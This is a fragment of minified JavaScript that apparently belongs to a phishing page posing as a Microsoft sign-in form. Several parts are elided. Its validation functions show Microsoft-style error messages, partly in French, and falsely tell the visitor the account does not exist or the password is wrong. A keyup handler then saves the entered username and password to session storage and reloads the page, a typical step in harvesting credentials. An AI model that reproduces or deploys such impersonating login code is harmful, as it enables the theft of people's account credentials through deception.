...
function validate() {
    const e = $("#result"),
        t = $("#email").val();
    return e.text(""), !!validateEmail(t) || (t ? (e.text("Ce compte Microsoft n'existe pas."), e.css("color", "red"), document.getElementById("loginForm").style.height = "403px") : (e.text("Enter a valid email address, phone number, or Skype\n name."), e.css("color", "red"), document.getElementById("loginForm").style.height = "403px"), !1)
}

function validatePassword() {
    const e = $("#passResult"),
        t = $("#password").val();
    return e.text(""), !(t.length < 8) || (e.text("Votre compte ou mot de passe est incorrect. Si vous ne vous souvenez pas de votre mot de passe,"), e.css("color", "red"), !1)
}
...
input1.addEventListener("keyup", (function (e) {
    ...
    validatePassword() && (sessionStorage.setItem("user", t), sessionStorage.setItem("password", e), setTimeout((function () {
        location.reload()
    }), 0))
